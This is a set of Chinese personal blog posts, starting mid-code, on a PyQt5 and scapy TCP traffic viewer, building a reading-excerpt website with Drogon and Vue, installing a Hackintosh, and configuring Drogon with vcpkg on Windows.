initUI(self) -\u0026gt; None: # 窗体 \u0026amp; 标题 self.setGeometry(300, 300, 500, 400) self.setWindowTitle(\u0026#34;Traffic Analyzer\u0026#34;) # 居中定位 self.alignCenter() # 设置提示框字体 QToolTip.setFont(QFont(\u0026#39;HanziPen TC\u0026#39;, 10)) # 关联事件 self.sniffer.updateSignal.connect(self.SnifferUpdate) # 创建按钮 ### 在线分析 startBtn = QPushButton(\u0026#39;在线分析\u0026#39;, self, clicked=self.sniffer.start) startBtn.setToolTip(\u0026#39;启动在线流量分析\u0026#39;) startBtn.resize(startBtn.sizeHint()) ### 结束在线分析 endBtn = QPushButton(\u0026#39;结束在线分析\u0026#39;, self, clicked=self.sniffer.pause) endBtn.setToolTip(\u0026#39;结束在线流量分析\u0026#39;) endBtn.resize(endBtn.sizeHint()) ### 打开文件 fileBtn = QPushButton(\u0026#39;打开文件\u0026#39;, self) fileBtn.setToolTip(\u0026#39;打开一个pcap文件\u0026#39;) fileBtn.clicked.connect(self.openFileDialog) fileBtn.resize(fileBtn.sizeHint()) ### 文本编辑 self.textEdit = QTextEdit() self.textEdit.setReadOnly(True) # 设置布局 grid = QGridLayout() self.setLayout(grid) grid.addWidget(startBtn, 0, 0) grid.addWidget(endBtn, 0, 1) grid.addWidget(fileBtn, 0, 2) grid.addWidget(self.textEdit, 2, 0, 5, 3) # 呈现 self.show() \u0026#39;\u0026#39;\u0026#39; 省略若干不重要的函数 \u0026#39;\u0026#39;\u0026#39; def SnifferUpdate(self): self.textEdit.setText(self.sniffer.text) self.textEdit.moveCursor(self.textEdit.textCursor().End) 上述代码的重点在于两个按钮的定义：\nstartBtn = QPushButton(\u0026#39;在线分析\u0026#39;, self, clicked=self.sniffer.start) ... endBtn = QPushButton(\u0026#39;结束在线分析\u0026#39;, self, clicked=self.sniffer.pause) self.sniffer 是一个自定义的对象，它应该基于 QThread 实现子线程，基于 scapy 实现抓包，基于 pyqtSignal 实现信号传递。\n# 继承 QThread 实现子线程 class Sniffer(QThread): # 用于向主窗口传说信号 updateSignal = pyqtSignal() def __init__(self) -\u0026gt; None: super().__init__() self.pktInfo = [] self.text = \u0026#39;\u0026#39; self.stopSniff = True # 重写 run 函数 def run(self): self.StartSniff() # 重写 pause 函数以停止抓包 def pause(self): self.EndSniff() # 基于 scapy 实现抓包 def StartSniff(self): self.stopSniff = False sniff(prn=self.SniffCallBack, count=0, stop_filter=self.isStop) def isStop(self, pkt): return self.stopSniff def EndSniff(self): self.stopSniff = True def SniffCallBack(self, pkt: scapy.packet.Packet) -\u0026gt; None: if pkt.haslayer(\u0026#39;TCP\u0026#39;): infoStr = pkt.sprintf(\u0026#34;TCP -\u0026gt; %IP.src%:%TCP.sport% -\u0026gt; %IP.dst%:%TCP.dport%\u0026#34;) self.pktInfo.append(infoStr) if len(self.pktInfo) \u0026gt; 100: for i in self.pktInfo: self.text += i + \u0026#39;\\n\u0026#39; self.pktInfo.clear() # 向主窗口发送一个信号 self.updateSignal.emit() 在这里，定义 SniffCallBack 的功能为捕捉TCP数据包，每捕捉一个包就产生一条记录信息，每捉满100个包 就向主窗体发送一个信号。\n在 Analyzer 中对子进程信号进行了处理：\nself.sniffer.updateSignal.connect(self.SnifferUpdate) ... def SnifferUpdate(self): self.textEdit.setText(self.sniffer.text) self.textEdit.moveCursor(self.textEdit.textCursor().End) 收到信号时，主窗体从 Sniffer 当中取出现有的所有数据包的信息，显示到文本框上，并将文本框滚动条滑至底部。\n总的代码如下：\nfrom struct import pack import sys from telnetlib import NOP from turtle import left from PyQt5.QtWidgets import (QApplication, QGridLayout, QToolTip, QPushButton, QMessageBox, QDesktopWidget, QWidget, QTextEdit, QFileDialog) from PyQt5.QtGui import QFont from PyQt5.QtCore import Qt, pyqtSignal, QThread from scapy.all import * class Sniffer(QThread): updateSignal = pyqtSignal() def __init__(self) -\u0026gt; None: super().__init__() self.pktInfo = [] self.text = \u0026#39;\u0026#39; self.stopSniff = True def run(self): self.StartSniff() def pause(self): self.EndSniff() def StartSniff(self): self.stopSniff = False sniff(prn=self.SniffCallBack, count=0, stop_filter=self.isStop) def isStop(self, pkt): return self.stopSniff def EndSniff(self): self.stopSniff = True def SniffCallBack(self, pkt: scapy.packet.Packet) -\u0026gt; None: if pkt.haslayer(\u0026#39;TCP\u0026#39;): infoStr = pkt.sprintf(\u0026#34;TCP -\u0026gt; %IP.src%:%TCP.sport% -\u0026gt; %IP.dst%:%TCP.dport%\u0026#34;) self.pktInfo.append(infoStr) # print(infoStr + \u0026#39;\\t\u0026#39; + str(len(self.pktInfo))) if len(self.pktInfo) \u0026gt; 100: for i in self.pktInfo: self.text += i + \u0026#39;\\n\u0026#39; self.pktInfo.clear() self.updateSignal.emit() class Analyzer(QWidget): def __init__(self) -\u0026gt; None: super().__init__() self.sniffer = Sniffer() self.initUI() def initUI(self) -\u0026gt; None: # 窗体 \u0026amp; 标题 self.setGeometry(300, 300, 500, 400) self.setWindowTitle(\u0026#34;Traffic Analyzer\u0026#34;) # 状态栏（父类 QMainWindow 与栅格布局冲突） # self.statusBar().showMessage(\u0026#34;就绪\u0026#34;) # 居中定位 self.alignCenter() # 设置提示框字体 QToolTip.setFont(QFont(\u0026#39;HanziPen TC\u0026#39;, 10)) # 关联事件 self.sniffer.updateSignal.connect(self.SnifferUpdate) # 创建按钮 ### 在线分析 startBtn = QPushButton(\u0026#39;在线分析\u0026#39;, self, clicked=self.sniffer.start) startBtn.setToolTip(\u0026#39;启动在线流量分析\u0026#39;) startBtn.resize(startBtn.sizeHint()) ### 结束在线分析 endBtn = QPushButton(\u0026#39;结束在线分析\u0026#39;, self, clicked=self.sniffer.pause) endBtn.setToolTip(\u0026#39;结束在线流量分析\u0026#39;) endBtn.resize(endBtn.sizeHint()) ### 打开文件 fileBtn = QPushButton(\u0026#39;打开文件\u0026#39;, self) fileBtn.setToolTip(\u0026#39;打开一个pcap文件\u0026#39;) fileBtn.clicked.connect(self.openFileDialog) fileBtn.resize(fileBtn.sizeHint()) ### 文本编辑 self.textEdit = QTextEdit() self.textEdit.setReadOnly(True) # 设置布局 grid = QGridLayout() self.setLayout(grid) grid.addWidget(startBtn, 0, 0) grid.addWidget(endBtn, 0, 1) grid.addWidget(fileBtn, 0, 2) grid.addWidget(self.textEdit, 2, 0, 5, 3) # 呈现 self.show() def closeEvent(self, event) -\u0026gt; None: reply = QMessageBox.question(self, \u0026#39;关闭程序\u0026#39;, \u0026#39;确定关闭程序？\u0026#39;, QMessageBox.Yes | QMessageBox.No, QMessageBox.No) if reply == QMessageBox.Yes: event.accept() else: event.ignore() def alignCenter(self) -\u0026gt; None: qr = self.frameGeometry() cp = QDesktopWidget().availableGeometry().center() qr.moveCenter(cp) self.move(qr.topLeft()) def keyPressEvent(self, e) -\u0026gt; None: if e.key() == Qt.Key_Escape: self.close() def openFileDialog(self): fname = QFileDialog.getOpenFileName(self, \u0026#39;打开文件\u0026#39;, \u0026#39;~/\u0026#39;, filter=\u0026#39;*.py\u0026#39;) if fname[0]: f = open(fname[0], \u0026#39;r\u0026#39;) with f: data = f.read() self.textEdit.setText(data) def SnifferUpdate(self): self.textEdit.setText(self.sniffer.text) self.textEdit.moveCursor(self.textEdit.textCursor().End) if __name__ == \u0026#39;__main__\u0026#39;: app = QApplication(sys.argv) analyzer = Analyzer() sys.exit(app.exec_()) 后记 初探PyQt和Scapy，自觉本文写得杂乱，仅做自娱。代码也许还有一些参考价值，请读者自行斟酌罢。\n","date":"2022-04-10T00:00:00Z","permalink":"https://xrg.fj.cn/p/pyqt5%E5%88%9D%E6%8E%A2%E4%B8%8Escapy%E7%9A%84%E7%BE%8E%E5%A6%99%E7%BB%93%E5%90%88/","title":"PyQt5初探——与scapy的美妙结合"},{"content":"自后端篇之后，各方面进度逐渐加快，以至于基本没有时间慢慢跟进记录了。\n目前站点已经上线 https://119.45.233.104/ ，直接访问会显示证书不安全，忽略安全警告即可（证书完全合法，产生警告是因为证书是跟域名绑定的）。其实域名也已经搞定了，但是解析到国内IP的域名需要备案，过一阵子再说吧～\n本篇主要是进行一个收尾总结工作，除非之后有较大改动，否则对于读书摘抄站点的叙述就到此为止了，总共三篇，事不过三嘛！\n0x00 后端开发环境转移 后端开发环境已由上一篇所述的 Windows+VisualStudio 改换到 CentOS 7+VSCode远程开发 ，引发这个决定的因素主要有几点：\nVisualStudio 对 CMake 项目不太友好，自动添加若干编译选项，还有各种Cache，每次编译都要面临各种依赖问题，很烦；\nVCPKG 安装的依赖存在大大小小的问题，折腾了若干次环境变量，我意识到根本没必要在这方面继续浪费时间了；\n导火索：根页面的控制器 IndexCtrl 都已经写完了，在尝试联通MySQL的时候报错找不到数据库，直接炸裂，怒而弃坑。\n还是依照 Drogon WiKi 在 CentOS 7 上配好了环境，没出现任何问题，不得不服气。\n在 Windows/MacOS 上都可以安装VSCode，下载 RemoteDevelopment 插件即可配置远程开发，网上教程很多，此处不表。\n0x01 前端引入VUE 在前后端结合的时候，出现了一个超级难受的情况：Drogon自带的页面渲染机制CSP出现了中文乱码的问题。这个问题不是Drogon的问题，而应该是我在配置编码上存在一些纰漏，但是 我不想承认我的问题 我不想花时间去调试这一非主流的技术，而且我一直担心我的小破服务器吃不消后端渲染，因此决定尝试一下此前从未搞过的前端渲染。\n前后端渲染的区别主要在于最终页面是在哪里生成的。后端渲染是在服务端生成我们最终看到的页面，而前端渲染主要是由浏览器生成我们最终看到的页面。前端渲染的好处是前后端连通的时候只需要传输一些简单的数据即可，而且由于“在前端渲染”这一特性，实现一些异步功能的时候更加简单（如分段加载）。\nVUE 是一个前端渲染框架，只需按照给定的语法，提供特定的数据（例如使用Ajax从服务端请求），就可以实现前端渲染。\n现有的VUE项目规模都比较大，用到了一些高级特性，如单文件组件等；我的读书摘抄站点满打满算一共三四个页面，不怎么存在组件复用等情况，因此我直接将每个文件都绑定一个VUE APP，各自实现其功能。对于VUE来说，主要只用到它的实时渲染的特性而已。\n前端引入VUE之后，交互就变得比较简单。目前还没有实现分段加载的功能，因此直接在页面加载的时候从后端获取所有数据。在VUE中定义一个 fetchData() 的方法，其中使用 axios 从后端请求数据，然后更新到实例的 data 上；这个方法在 mounted() 的时候被调用。需要注意，在 fetchData() 里面使用的 this 指向的不是组件实例，要从外部传入实例才行。\nconst app = Vue.createApp({ // ==== 略 ==== methods: { // ==== 略 ==== fetchData(vueThis) { axios .get(\u0026#39;/index\u0026#39;) .then(function (response) { var respJSON = JSON.parse(JSON.stringify(response.data)); vueThis.login = respJSON[\u0026#34;login\u0026#34;]; vueThis.cards = respJSON[\u0026#34;cards\u0026#34;]; vueThis.totalBooks = respJSON[\u0026#34;totalBooks\u0026#34;]; }) .catch(function (error) { console.log(error); }); } }, mounted() { let vueThis = this; this.fetchData(vueThis); } }).mount(\u0026#39;#app\u0026#39;) 0x02 交互逻辑设计 总体交互逻辑 整个站点的交互逻辑比较简单，无论是否登录都能查看我的摘抄内容。登录的作用目前仅限于发布摘抄（将来有多人使用该站点的时候可以正式加入用户功能）。\n个人认为登录认证的模块做得还不错，实际上也是本站工作量的集中体现，后续详谈。\n0x03 登录认证 本站登录认证机制是 公私钥认证 ，实现思路如下：\n登录认证机制 用户向服务器发起登录请求，携带参数 user=xxx ；\n服务器根据用户名找到该用户的公钥（已经预先保存好），生成随机字符串 s ，保存 user-s 这一映射关系；用公钥加密 s 得到加密后的字符串 question ，该加密串还需要使用Base64编码，然后传输到前端；\n前端脚本得到 question ，使用用户输入到文本框的私钥对其进行解密，得到解密后的字符串 answer ，返回给服务器，参数为 user=xxx;answer=xxxxx ；\n服务端收到 answer ，将其与 s 进行对比；\n登录成功：服务端生成JWT（Json Web Token），返回前端告知登录成功；\n登录失败：返回前端告知登录失败。\n登录成功之后前端会获取一个JWT，将其保存到cookie；\n此后所有请求都会带上JWT，后端获取JWT进行验证即可判断用户的登录状态。\n这个登录机制的安全分析如下：\n每个用户对应的公私钥都是唯一的，使用用户公钥加密的随机串，只有拥有私钥的用户才能解密，因此，用户的身份可以得到确认；\n用户私钥只用于浏览器端解密，不传输到网络上，因此私钥私密性可以保证；\n登录成功之后获取的JWT，标准的实现办法应该是将其存放到 local storage ，但这里直接存到cookie，主要是基于实现难度进行的选择；\ncookie需要针对CSRF攻击进行一系列加固（HTTP only等）；\n简单记录一下这个登录机制的实现方案：\n后台C++使用openssl实现的RSA公钥加密，支持的公钥格式应以 BEGIN PUBLIC KEY 开头；\n#include \u0026lt;drogon/utils/Utilities.h\u0026gt; 并使用 utils::base64Encode 这个Drogon API来进行Base64编码；\n引入 CPP-JWT 这个第三方库来实现JWT的生成和解析；\n前端使用 JSEncrypt 来实现RSA私钥解密；\nJWT和cookie都设置过期时间（暂定1天）。\n这个方案其实进行了一些取舍：\nJWT存到cookie，是一种妥协。标准的做法是实现 本地存储 ，然后每次进行请求时都从本地获取JWT并放入请求头（如axios设置拦截器）。但是，我的页面中并不是所有的请求都是由我控制的，即并不是所有请求都是由Ajax代码发起的：当直接使用浏览器访问某个页面时发起的GET请求就可能不带JWT，就失去了一致性；将JWT放到cookie中可以解决这一问题，带来的CSRF等安全性问题则需要其他办法进行加固。\n急于上线使用，没有手撸加密算法，因此学到的东西不多。 😢\n0x04 数据库 数据库也是可能出现安全问题的一个点，当初构思时考虑了 加密存储 ，后来觉得这种私密性很弱的数据库没有什么加密的必要（本来就是希望所有人都能看到我摘抄的内容），因此放弃了加密的想法。\n数据库方面有几个要点：\n使用了Drogon的 ORM模型 ，即，Drogon提供的将数据库操作抽象出来的一套方法；使用了ORM之后，我的操作就只有 mapper.insert() 和 mapper.findAll() 了，后续要加功能的话再研究条件查询；\n数据库里面的 bookName 和 excerpt 字段是非空的，即书籍名称和摘抄内容是非空的（不然还叫什么摘抄），因此在收到数据的时候要进行检查（前端也检查了一遍，但众所周知前端检查没啥用）；\n防SQL注入！防SQL注入！防SQL注入！ 这一点被ORM模型承包了，很提升幸福感；最初的方案是自己构造SQL，C++字符串转义什么的，比PHP还原始，比较痛苦。\n灾备。考虑过若干方案，比如将mysql文件同步到OneDrive啥的，最后实现的办法是每天定时做一次全量备份，用 mysqldump 把数据库弄出来，把数据 加密压缩 然后自动push到Gitee上。更加理想的方案是全量备份 + binlog 增量备份，但是考虑到实现起来多一些步骤、而且我的数据库很小、就没有使用这个方案。\n0x05 页面修修补补 前端页面CSS也是出了一些问题的，我把几个比较重要（但不一定困难）的修补在这里记录一下：\n.content-wrapper 类要添加 height: 112.5px; 属性，不然在FireFox和Safari浏览器下面排版会错乱，具体表现为 overflow: hidden 不起作用，被子元素撑开）；\n.card 类要添加 white-space: pre-wrap; 属性，不然换行会变成空格；读书摘抄没有换行简直是噩梦。这里不得不说一句Drogon的ORM做得很不错，把前端文本框传来的换行符忠实地存入数据库中了，省却一大堆事；\n0x06 内容在线修改 2022-03-09加\n原先就有的一个想法，希望在登录状态下能对浏览的卡片进行在线修改（例如心血来潮地添加一些评论或者纠正一下当初录入的错别字等等）。\n这块功能在最初编写卡片代码的时候就预留出来了，按钮使用的是Bootstrap提供的三个图标，分别表示“开始编辑”、“保存编辑”、“取消编辑”。\n把它们各自的功能简单叙述一下。\n开始编辑：\n点击“开始编辑”，出现“保存编辑”和“取消编辑”按钮；\n获取原卡片数据，即把原本的书籍名称、摘抄内容、文章日期等内容都保存到全局变量里面，以便后续取消编辑的时候把数据恢复；\n替换卡片元素，即把原本的 \u0026lt;h4\u0026gt; 、 \u0026lt;div\u0026gt; 等标签替换为可编辑的输入框，这一点跟发布内容的时候是一样的，摘抄和评论用的是 textarea 而书籍名称等用的是 input 。这一步的做法用到了jQuery的 $(obj).before() 和 $(obj).remove() 这两个操作，分别是添加元素和删除元素。\nTips：要对添加的 input 和 textarea 添加 onclick 事件，然后使用 event.stopPropagation() 来阻止冒泡，不然点击文本框的时候会触发卡片的回弹。\n取消编辑：\n与“开始编辑”的逻辑相反，点击后把文本框换回 \u0026lt;h4\u0026gt; 、 \u0026lt;div\u0026gt; 等标签，并把保存在全局变量中的原数值复原回去；\n恢复元素这一系列操作要抽出来形成一个单独的函数，在卡片回弹的时候也要执行这个函数。\n保存编辑：\n获取文本框中的数值，然后用axois发送给后端；\nDrogon使用 mapper.update(singleRow) 来更新数据库；\n如果后端操作成功，则编辑保存完毕，更新全局变量，然后把卡片复原为只读形式；\n如果后端操作失败， alert() 报错消息（本来应该自己做一个消息窗体以改善体验，但是有点懒，直接Alert了）。\n在线更新功能的实现使整个站点的成熟度得到了飞跃，至此它已经跟一个在线记事本一样了。我可以自由地添加内容、修改内容，且每天都有数据库的备份，基本上完成了最初预想的功能。\n0x07 图片分享 写于2022-06-09\n时隔三月，重新搞起了读书摘抄站点~ 🤔\n这次添加的是最初规划时就考虑到的分享功能，之前一直没有实现主要是因为懒，且觉得这个自娱自乐的站点貌似不太需要分享功能；最近想跟朋友分享我摘抄的一些很好的片段时，总得自己手动截图，比较难受；更有甚者，一些比较长的片段没法一次性截取完全，于是萌生出把分享功能完成的想法。\n一直以来比较心水一键生成图片的那种功能，这次的开发就以图片分享为目标。\n图片分享的基本原理：使用HTML canvas 绘制矢量图，之后可以选择使用 canvas.toDataURL 生成图片URL并生成 img 图片，或对 canvas 进行其他操作（如复制到剪贴板）。\n图片分享的关键步骤是如何将要分享的内容绘制到 canvas 上，这一步有成熟的第三方工具 html2canvas ，可以自动解析DOM元素并生成图片，受到网上各教程的广泛使用。不过，经过我的测试，这个工具在绘制我的摘抄时会丢失一些样式，而且还得去调试它的各种参数，属于自讨苦吃，大可不必。\n重新思考之后，我认为我的需求比较简单：只是将要分享的 文字内容 转换成图片而已，没有多少麻烦的步骤，因此决定手撸 canvas 。\n生成分享图片的整体流程非常简单：\n流程 画布长宽根据屏幕大小而改变，但始终保持一个固定的比例：\nlet width = $(window).width() * 0.6; let height = $(window).height() * 0.9; 画布的内容组织结构也很简单，只有三个部分：\n内容结构 使用 let ctx = canvas.getContext(\u0026quot;2d\u0026quot;); 得到画布主体，之后获取目标内容进行绘制。\n头部图片，设置好宽高，然后 ctx.drawImage(img, 0, 0, width, imgHeight); 。\n文字部分，要先绘制一个矩形背景，否则文字没有底色：\nctx.fillStyle = \u0026#34;#ffffff\u0026#34;; ctx.fillRect(0, height * 0.3, width, height); 使用jQuery提取要分享的内容（通过DOM树获取书籍名称和摘抄内容的相应节点），分别在各自的位置上绘制字符串。\n// 绘制文字 ctx.fillStyle = \u0026#34;#000000\u0026#34;; let opt = { \u0026#39;headerHeight\u0026#39;: 0.08 * height, \u0026#39;leftPadding\u0026#39;: 16, \u0026#39;rightPadding\u0026#39;: 5, \u0026#39;bottomPadding\u0026#39;: 16, \u0026#39;textHeight\u0026#39;: 0.6 * height, \u0026#39;textWidth\u0026#39;: width, \u0026#39;maxFontSize\u0026#39;: 20 } // 书籍名称 let fontSize = opt.headerHeight; fontSize = Math.min(fontSize, 24); ctx.font = fontSize.toString() + \u0026#39;px \u0026#39; + \u0026#39;Long Cang\u0026#39;; ctx.fillText(bName.text(), opt.leftPadding, imgHeight + opt.headerHeight * 0.7); // 摘抄内容 let text = $(exp).text(); let realTextWidth = opt.textWidth - opt.leftPadding - opt.rightPadding; let realTextHeight = opt.textHeight - opt.bottomPadding; fontSize = Math.floor(Math.sqrt(Math.floor((realTextHeight * realTextWidth) / (2 * text.length)))); fontSize = Math.min(fontSize, opt.maxFontSize); ctx.font = fontSize.toString() + \u0026#39;px \u0026#39; + \u0026#39;Noto Serif SC\u0026#39;; let cols = Math.floor((realTextWidth) / fontSize); let rows = Math.ceil(text.length / cols); for (let i = 0; i \u0026lt; rows; i++) { // 注意 substring 和 substr 两个不同API的区别 ctx.fillText( text.substr(i * cols, cols), opt.leftPadding, imgHeight + opt.headerHeight + fontSize * 2 * (i + 1) ); } 这里为了使得大段文字能够写入到一个固定高度的区域中，需要对 字体大小 进行一些数学上的计算。\n已知待写入的字符串为 text ，画布文字部分宽度为 realTextWidth ，高度为 realTextHeight ，令字体大小为 fontSize ，则\n$$ \\text{列数 }col = \\frac{realTextWidth}{fontSize} $$\n$$ \\text{行数 }row = \\frac{text.length}{col} $$\n令行高为两倍字体大小，即\n$$ lineHeight = 2 \\times fontSize $$\n那么文字部分总共需要占据的高度就有\n$$ row \\times lineHeight = \\frac {text.length \\times fontSize}{realTextWidth} \\times fontSize \\times 2 $$\n它不能超过画布提供的高度，否则会溢出，也就是需要满足\n$$ \\frac {text.length \\times fontSize}{realTextWidth} \\times fontSize \\times 2 \\leq realTextHeight $$\n$$ \\text{解得 }fontSize \\leq \\sqrt{\\frac{realTextHeight \\times readTextWidth}{2 \\times text.length}} $$\n这就是字体大小的要求。满足这一大小要求的字体才能将一个片段完整地写入画布中。\n另一个 需要注意的地方是， canvas 写入文字时不能自动换行，超出画布的部分即不可见。为了实现 文字换行 的效果，需要手动对原始字符串进行切分，每一次只写入原始字符串的一部分（实际上就是写入列数 col 个字符），移动至下一行，再继续写入，这就是上方代码中的最后一个 for 循环所做的事情。\n完成以上几点之后，能够绘制出一张很不错的分享图了：\n分享图 最后，添加一个按钮，用于将这张图片一键保存到剪贴板。这里给出两篇重要参考， 第一篇 教会我们如何把 canvas 转化为可以写入剪贴板中的数据； 第二篇 介绍了浏览器的 navigator.clipboard.write 接口的用法，据此，可以实现一键复制图片的功能。\n0x08 To Do 本文的叙述相比之前的两篇简单很多，因为内容实在太多了，详写不来 😢\n整个站点还有一些地方是可以改进的：\n分段加载！每次只加载一部分记录，滑动到最底部时再继续发起请求。这个功能需要前端发起请求时带上一些参数，后端数据库查询时也进行一些修改。\n卡片出现的动画。试试VUE的transition标签，总之就是使卡片出现的时候丝滑一点。\n大起始页。访问其他大佬的博客时觉得他们的首页美图很不错，滚动滚轮能触发全屏滚动呈现真正内容，可以考虑学习实现一下。\n发布/展示页面对Markdown语法的支持，似乎用一些Javascript库就可实现。\n……\n","date":"2022-03-07T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E8%AF%BB%E4%B9%A6%E6%91%98%E6%8A%84%E7%AB%99%E7%82%B9%E6%9E%84%E5%BB%BA%E5%89%8D%E5%90%8E%E7%AB%AF%E7%BB%93%E5%90%88/","title":"读书摘抄站点构建（前后端结合）"},{"content":"最近太闲，时常想着把老电脑重装一下，不过Windows的C盘总是莫名其妙地渐渐跑满，非常烦人；加之一直以来对Mac OS的好奇，决定在老电脑上搞个黑苹果（Hackintosh）玩一玩。\n黑苹果指的是在 非Apple设备上运行Mac OS ，可以理解为在自己的机器上运行一个盗版系统，一般来说会导致几个问题：\n硬件摆烂。因为Mac不可能针对非自家产品进行完美的适配；装上黑苹果之后，运气不好的话可能网卡、USB口、蓝牙等等都失效； 无法启动。这个原因就很多了，庆幸自己没有遇到。 本篇主要记录自己的Hackintosh之旅，由于笔者仍是初学且并不追求完美，本文仅供日后自行翻阅，对外人并无参考价值，留意留意。\nStep0 Video教程 From YouTube。请科学上网 😊\n这篇教程是极具指导意义的教程，按照教程的指示，基本没有出现太多错误。放在首位，并不是说只需照着教程去做而已，而是可以先看看教程里面的内容，后面再进行详细定制。\nStep 1 EFI 教程里面有用到EFI文件。这是黑苹果启动时需要的文件，每个机型的引导文件不尽相同。如果EFI不合适的话，自然就不能启动啦！\n我的电脑是 ASUS FL8000UQ ，使用了 https://github.com/alexanderkin/ASUS-FL8000UQ-Hackintosh 开源的EFI文件。\n各机型和其对应的EFI可以从 https://gitee.com/softxing/Hackintosh 找到。\nStep 2 解锁CFG Lock CFG Lock用于保护MSR 0xE2单元，开启CFG锁之后，MSR（特定模块寄存器，用来控制CPU的工作环境和读取工作状态）的0xE2单元就不能写入了。不过苹果系统通过这个单元来管理电源！不能写入的话可就麻烦了，需要解锁！\n在我的机型中，按照EFI文件那个仓库里面的做法解锁即可。\nStep 3 修改config.plist 这一步就在 Video教程 里面而已，主要就是改一下 三码 ，照着做即可！\nStep 4 禁用各种BIOS选项 重要！我刚开始做的时候就是因为漏掉某些选项没有禁，搞得系统一直装不上！\n教程里面有清单的，或者按照下图的选项逐一禁用：\nImg Step 5 改Mindate 重要！OpenCore在引导的时候，居然对系统版本进行了限制。要参考 这篇文章 来把限制关闭掉。\nStep 6 安装 直接U盘启动啊！So Easy！\n安装过程中有一些小插曲：\n磁盘识别不到。因为原本的Win10系统用的是MBR分区，而Mac只能识别GPT分区，搞得我特别难受。后面重新制作了个Windows的启动盘，在安装界面用了命令行操作把磁盘重新格式化了，然后才重新开始Mac的安装。详见 此篇 ，只能说CSDN偶尔还是有点好东西 😏 安装完毕之后进不了系统，重启的时候还是只能从U盘进入恢复模式。这个问题非常烦人，使我重装了N遍系统（为我的硬盘感到忧伤），一度使我想要放弃，最后按照上一步的指示把Mindate改掉即可。 Step 7 更新Wi-Fi驱动 我的网卡是原装的AR9565，按照 这篇文章 完美搞定Wi-Fi驱动。\nStep 8 总结 目前还有一些小问题没有解决（不想解决了，系统能稳定使用就好）：\n睡眠秒醒。据说要定制USB，又得折腾驱动，我的系统已经半投入生产了，有风险不搞； 关机等于重启。这个还是比较伤，不过问题并不大，一天也就被恶心这么一次，关机重启之后再从引导界面关一次就好。 同时令我惊喜的点还是比较多的：\n声卡、麦克风、键鼠、USB均开箱即用；Wi-Fi更新驱动基本不费力，总体具备一台电脑90%能力； Mac真心好看；好的设计可能是趋同的，至少Win11确实有很大的“果味”；已在App Store购入动态壁纸引擎。 Desktop 2021-05-24更新\nHackintosh已使用三个月有余，甚至已经习惯了这个系统奇怪的快捷键逻辑。最近父亲的老电脑坏了，我的这台ASUS FL8000U大概也将要完成它在我这的使命，而交由我的父母继续使用。\n伴我四年的电脑，可以说是我大学成长的见证者；Hackintosh是它绽放出的最后一抹光和热，在此把我玩过的最后一些内容记录完，便与它告别了。\nStep9 USB定制 刚装上这个系统时存在睡眠秒醒和关机变重启的问题，这个问题要通过USB定制来解决。\n首先，Hackintosh上应该装上Open Core Configurator和Hackintool这两款软件，前者用于修改OC引导文件，后者用于完成USB定制步骤。\n直接参照 使用 Hackintool 定制黑苹果 USB 端口，适用于 Clover \u0026amp; OpenCore-黑苹果星球 (heipg.cn) 这篇文章即可，我的老电脑全是USB 2接口，工序很简单。\nStep10 系统升级 之前装的系统是Catalina，这个系统上现在已经装不了iWorks办公软件了；近期写论文、做PPT全都使用WPS，体验跟Office产生了比较大的割裂，痛苦。\n插一嘴：写论文期间，分别尝试了Office、WPS、Office365，各有各的不同，就很离谱。抛开UI逻辑不谈，连同一份Word都能给我解析出不同的排版，我是真的服气。个人感觉Office365最糟心，在网盘上做出的修改似乎莫名其妙就丢失了，要么就是文字还在，格式没了，给我看笑了；WPS次之，不知道是不是WPS for Mac比较特殊，反正就是很难受，格式也是各种跑位，操作也不丝滑；Office原生体验最佳，大抵是用得习惯了吧。\nCatalina会自动下载Monterey更新，不过我害怕它变砖，一直不敢安装；现在既然要退役了，决定试验最后一波。\n安装！\n成功。\nMonterey 真的就……没得说，我没想到Hackintosh是可以直接升级的，重启了几次之后，我进入到MacOS Monterey的界面了。看来我的这次黑苹果之旅还是比较成功的。\n睡眠秒醒问题不存在；Wifi搜不到信号，这个问题估计换个驱动可以解决。\nStep11 告别 Monterey留在我的电脑上不到一小时，已经要与它告别了。\n并没有很多东西想说，毕竟将来还是要继续玩的；不过还是应该跟我任劳任怨的老电脑说一句：辛苦了！\n","date":"2022-02-22T00:00:00Z","permalink":"https://xrg.fj.cn/p/hackintosh%E5%B0%8F%E8%AE%B0/","title":"Hackintosh小记"},{"content":"书接上文，前端暂告一段落之后就要准备后端了。\n我原本已经在服务器上用Docker运行过Drogon，但是服务器+vim的开发环境属实有点不太直观，还是决定在Windows上也配一个Drogon环境，结果遇到了不少坑，稍做记录，是为站点后端第一篇。\nStep0 环境配置 VCPKG安装+集成 第一步是安装VCPKG，这是微软开发的一款C++软件包管理工具，Drogon就通过这款工具下载。\n去到 microsoft/vcpkg: C++ Library Manager for Windows, Linux, and MacOS (github.com) 下载代码或克隆仓库，运行 bootstrap-vcpkg.bat 完成安装。会生成一个 vcpkg.exe ，可以添加环境变量以便全局使用。\n使用 vcpkg search drogon 既可以初步观察到Drogon库的情况；同时，这条命令的顺利运行也就表示我们的安装已经成功。\nvcpkg安装成功 使用命令 vcpkg integrate install 可以将vcpkg进行全局集成，此后从VCPKG下载的库都能在Visual Studio里面直接使用。全局集成可以通过 vcpkg integrate remove 来移除。\n对于工程项目的集成，应该通过 vcpkg integrate project 来完成，这样在单一项目中下载的库不会影响到其他项目，较为理想。具体做法参见参考资料 [1] ，我选择直接使用全局集成。\nDrogon安装 使用命令 vcpkg install drogon 或命令 vcpkg install drogon:x64-windows 来安装Drogon，前者安装的是X86的包，后者安装的是X64的包。\n安装完成之后，应该从 [VCPKG PATH]\\installed\\x86-windows\\tools\\drogon 文件夹中找到 drogon_ctl 工具，该工具可以帮助我们生成Drogon项目及一系列组件，很有意义；我在初次安装的时候并没有找到这个工具，通过 vcpkg install drogon[ctl] 实现手动安装。\n至此，可以使用 drogon_ctl create project [ProjectName] 来创建一个Drogon项目了。\nStep1 运行 IDE配置 完成环境的配置到可以运行，还需要若干步骤，而这些步骤花费了我相当一些时间，因此有必要予以记录。\n假定我们已通过 drogon_ctl create project server 来创建一个名为 server 的项目，第一件事是 使用Visual Studio打开该项目 。\n用VS 打开本地文件夹 的方式打开项目，IDE自动识别该项目为CMake项目，完成CMake的一些前期配置。\n紧接着并不是直接运行，而是通过【Project】\u0026ndash;\u0026gt;【CMake Settings for server】这个路径来完善CMake的配置；务必在这个地方勾选Drogon路径，否则IDE无法完成Drogon框架的编译。\n勾选Drogon路径 